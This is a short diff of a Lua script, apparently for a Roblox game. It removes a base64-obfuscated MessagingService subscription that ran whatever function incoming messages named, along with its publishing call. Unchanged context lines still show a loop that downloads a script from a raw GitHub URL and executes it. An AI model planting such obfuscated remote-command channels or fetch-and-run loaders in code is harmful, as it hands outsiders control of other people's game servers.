@@ -76,8 +76,6 @@ local Global
 local Rewrite
 
 function m:StartScript()
-	local s,c
-	--print("Starting!")
 	if Vers then
 		if PACon then
 			PACon:Disconnect()
@@ -125,10 +123,6 @@ function m:StartScript()
 
 		}
 
-		if s then
-			MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'globalfunc'})
-		end
-
 		task.delay(10, function()
 			for i, v in pairs(Players:GetPlayers()) do
 				Mainfuncs:PlayerAdded(v)
@@ -144,24 +138,11 @@ function m:StartScript()
 			Rewrite = true
 		end
 	end
-
-	local function msc(m)
-		Global[m.Data.Command](m.Data)
-	end
-
-	repeat
-		s, c = pcall(function()
-			MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
-		end)
-		task.wait()
-	until
-	s
 end
 
 task.spawn(function()
 	local s,c 
 	while true do
-
 		s,c = pcall(function()
 			Vers = Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/version.lua'))()
 		end)
